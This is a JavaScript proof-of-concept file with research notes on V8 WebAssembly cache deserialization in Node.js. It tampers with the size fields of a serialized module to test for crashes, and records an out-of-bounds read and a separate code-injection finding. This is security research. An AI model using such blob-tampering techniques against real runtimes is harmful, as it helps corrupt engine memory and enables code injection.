// V8 Wasm Cache — DoS / Memory Safety Notes
// Node.js v22.23.5 / V8 12.4.254.21-node.57
//
// This file documents the DoS surface adjacent to the injection vulnerability.
//
// Findings:
//   1. TCS inflation (setting total_code_size >> actual) — does NOT crash in
//      release Node.js v22.23.5 because:
//        • remaining_code_size_ bounds checks are DCHECK (disabled in release)
//        • Linux over-commits virtual address space; large mmap succeeds
//        • The final CHECK_EQ on reader->current_size() still passes since the
//          blob ends correctly regardless of TCS
//
//   2. code_size field inflation — does NOT crash in V8 12.4.x because:
//        • The CHECK_LE(code_size, current_code_space_.size()) at line 1032 of
//          the CURRENT V8 trunk source (v16.0) was likely not present in V8 12.4
//        • V8 12.4's ReadCode has a shorter kCodeHeaderSize (54 B vs 70 B in trunk)
//          indicating substantial differences in the deserialization path
//
//   3. reader->ReadVector OOB — inflating code_size causes ReadVector<uint8_t>
//      to advance the reader pointer past the blob end. In V8 12.4 Node.js release
//      builds, this succeeds silently (reader does not bounds-check; the returned
//      vector points into already-mapped memory past the blob). This is a
//      type-confusion hazard but does not immediately crash.
//
// Summary: V8 12.4 release builds are more permissive than the current V8 trunk
// source suggests. The injection vulnerability (poc_injection.js) is the primary
// exploitable finding. The DoS paths require a debug build or a newer V8.
//
// Run: node --allow-natives-syntax --no-wasm-lazy-compilation poc_dos.js

'use strict';

const TCS_OFF      = 20;   // total_code_size field (uint64_le)
const CODE_SIZE_OFF = 58;  // per-function code_size field (uint32_le)

const POISONER = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x05,0x01,0x01,0x66,0x00,0x00,
  0x0a,0x19,0x01,0x17,
    0x01,0x01,0x7f,
    0x03,0x40,
      0x20,0x00,0x41,0x01,0x6a,0x21,0x00,
      0x20,0x00,0x41,0x32,0x48,0x0d,0x00,
    0x0b,
    0x20,0x00,0x0b,
]);

console.log('=== V8 Wasm Cache Memory Safety Investigation ===');
console.log('Node.js', process.version, '/ V8', process.versions.v8);
console.log('');

process.stdout.write('[1] Warming up to TurboFan... ');
const m = new WebAssembly.Module(POISONER);
const inst = new WebAssembly.Instance(m);
let w = 0; for (let i = 0; i < 100000; i++) w += inst.exports.f();
console.log('f()=' + inst.exports.f());

const blob = %SerializeWasmModule(m);
const bv = new Uint8Array(blob);
const dv = new DataView(blob);
if (bv[29] !== 0x04) { console.error('[!] Not TurboFan'); process.exit(1); }
const realTCS      = Number(dv.getBigUint64(TCS_OFF, true));
const realCodeSize = dv.getUint32(CODE_SIZE_OFF, true);
console.log('[2] Blob: ' + blob.byteLength + ' B  TCS=' + realTCS + '  code_size=' + realCodeSize);

// --- Test TCS inflation ---
{
  const b = blob.slice(0);
  new DataView(b).setBigUint64(TCS_OFF, BigInt(0x40000000), true);
  const m2 = %DeserializeWasmModule(b, POISONER);
  console.log('[TCS=1GiB] result:', m2 ? 'non-null (no crash — DCHECK only in release)' : 'null');
}

// --- Test code_size inflation ---
{
  const b = blob.slice(0);
  new DataView(b).setUint32(CODE_SIZE_OFF, 0x40000000, true);
  const m2 = %DeserializeWasmModule(b, POISONER);
  console.log('[code_size=1GiB] result:', m2 ? 'non-null (no crash — different V8 12.4 path)' : 'null');
}

console.log('');
console.log('Conclusion: Crash-based DoS not achievable via field inflation in');
console.log('  Node.js v22.23.5 (V8 12.4) release builds.');
console.log('  Primary security impact: see poc_injection.js (code injection).');
